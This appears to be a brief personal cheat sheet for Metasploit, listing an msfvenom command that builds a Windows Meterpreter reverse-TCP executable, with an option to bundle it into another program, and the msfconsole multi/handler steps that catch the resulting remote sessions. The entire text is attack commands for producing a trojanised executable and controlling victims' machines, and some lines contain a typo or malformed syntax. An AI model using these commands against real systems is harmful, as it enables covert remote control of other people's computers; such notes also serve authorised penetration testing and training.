msfvenom -p windows/merterpreter/reverse_tcp -a x86 --platform windows -f exe -o ./filename.exe LHOST=ip LPORT=4444 -x $x
-a = architecture(msfvenom -l architectures) 
-f = format(msfvenom -l formats)
-p = payloads(msfvenom -l payloads)
-x = 捆绑

# Connect
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST=IP
set LPORT=4444
run

set exitonsession false(allow multiple sessions)
run -j(running in background)
